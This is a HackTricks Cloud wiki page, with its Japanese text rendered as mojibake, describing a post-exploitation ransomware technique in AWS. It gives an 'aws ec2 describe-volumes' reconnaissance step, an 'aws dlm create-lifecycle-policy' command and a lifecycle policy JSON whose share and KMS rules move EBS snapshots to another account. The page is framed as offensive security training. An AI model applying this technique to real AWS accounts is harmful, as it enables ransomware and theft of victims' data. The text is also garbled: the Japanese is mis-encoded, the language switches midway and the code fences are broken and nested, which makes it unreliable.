# AWS - ãƒ‡ãƒ¼ã‚¿ãƒ©ã‚¤ãƒ•ã‚µã‚¤ã‚¯ãƒ«ãƒãƒãƒ¼ã‚¸ãƒ£

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã®å­¦ç¿’ã¨ç·´ç¿’: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ **ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„ã€‚
* **HackTricks**ã¨**HackTricks Cloud**ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦**ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰**ã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}

## ãƒ‡ãƒ¼ã‚¿ãƒ©ã‚¤ãƒ•ã‚µã‚¤ã‚¯ãƒ«ãƒãƒãƒ¼ã‚¸ãƒ£ï¼ˆDLMï¼‰

### `EC2:DescribeVolumes`, `DLM:CreateLifeCyclePolicy`

ãƒ©ãƒ³ã‚µãƒ ã‚¦ã‚§ã‚¢æ”»æ’ƒã¯ã€ã§ãã‚‹ã ã‘å¤šãã®EBSãƒœãƒªãƒ¥ãƒ¼ãƒ ã‚’æš—å·åŒ–ã—ã€ç¾åœ¨ã®EC2ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã€EBSãƒœãƒªãƒ¥ãƒ¼ãƒ ã€ãŠã‚ˆã³ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã‚’æ¶ˆå»ã™ã‚‹ã“ã¨ã§å®Ÿè¡Œã§ãã¾ã™ã€‚ã“ã®æ‚ªæ„ã®ã‚ã‚‹æ´»å‹•ã‚’è‡ªå‹•åŒ–ã™ã‚‹ãŸã‚ã«ã€Amazon DLMã‚’ä½¿ç”¨ã—ã¦ã€åˆ¥ã®AWSã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‹ã‚‰KMSã‚­ãƒ¼ã§ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã‚’æš—å·åŒ–ã—ã€æš—å·åŒ–ã•ã‚ŒãŸã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã‚’åˆ¥ã®ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«è»¢é€ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã€æš—å·åŒ–ã›ãšã«ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã‚’ç®¡ç†ã™ã‚‹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«è»¢é€ã—ã€ãã“ã§æš—å·åŒ–ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚æ—¢å­˜ã®EBSãƒœãƒªãƒ¥ãƒ¼ãƒ ã‚„ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã‚’ç›´æ¥æš—å·åŒ–ã™ã‚‹ã®ã¯ç°¡å˜ã§ã¯ã‚ã‚Šã¾ã›ã‚“ãŒã€æ–°ã—ã„ãƒœãƒªãƒ¥ãƒ¼ãƒ ã‚„ã‚¹ãƒŠãƒƒãƒ—ã‚·ãƒ§ãƒƒãƒˆã‚’ä½œæˆã™ã‚‹ã“ã¨ã§å¯èƒ½ã§ã™ã€‚

ã¾ãšã€ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹IDã€ãƒœãƒªãƒ¥ãƒ¼ãƒ IDã€æš—å·åŒ–ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã€ã‚¢ã‚¿ãƒƒãƒãƒ¡ãƒ³ãƒˆã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã€ãƒœãƒªãƒ¥ãƒ¼ãƒ ã‚¿ã‚¤ãƒ—ãªã©ã®æƒ…å ±ã‚’åé›†ã™ã‚‹ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚
```aws ec2 describe-volumes```

Secondly, one will create the lifecycle policy. This command employs the DLM API to set up a lifecycle policy that automatically takes daily snapshots of specified volumes at a designated time. It also applies specific tags to the snapshots and copies tags from the volumes to the snapshots. The policyDetails.json file includes the lifecycle policy's specifics, such as target tags, schedule, the ARN of the optional KMS key for encryption, and the target account for snapshot sharing, which will be recorded in the victim's CloudTrail logs.


```bash
```md
## AWS DLM Post-Exploitation

To create a lifecycle policy, use the following command:

```bash
aws dlm create-lifecycle-policy --description "My first policy" --state ENABLED --execution-role-arn arn:aws:iam::12345678910:role/AWSDataLifecycleManagerDefaultRole --policy-details file://policyDetails.json
```
```
```

A template for the policy document can be seen here:
```bash
```json
{
"PolicyType": "EBS_SNAPSHOT_MANAGEMENT",
"ResourceTypes": [
"VOLUME"
],
"TargetTags": [
{
"Key": "ExampleKey",
"Value": "ExampleValue"
}
],
"Schedules": [
{
"Name": "DailySnapshots",
"CopyTags": true,
"TagsToAdd": [
{
"Key": "SnapshotCreator",
"Value": "DLM"
}
],
"VariableTags": [
{
"Key": "CostCenter",
"Value": "Finance"
}
],
"CreateRule": {
"Interval": 24,
"IntervalUnit": "HOURS",
"Times": [
"03:00"
]
},
"RetainRule": {
"Count": 14
},
"FastRestoreRule": {
"Count": 2,
"Interval": 12,
"IntervalUnit": "HOURS"
},
"CrossRegionCopyRules": [
{
"TargetRegion": "us-west-2",
"Encrypted": true,
"CmkArn": "arn:aws:kms:us-west-2:123456789012:key/your-kms-key-id",
"CopyTags": true,
"RetainRule": {
"Interval": 1,
"IntervalUnit": "DAYS"
}
}
],
"ShareRules": [
{
"TargetAccounts": [
"123456789012"
],
"UnshareInterval": 30,
"UnshareIntervalUnit": "DAYS"
}
]
}
],
"Parameters": {
"ExcludeBootVolume": false
}
}
```
```

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
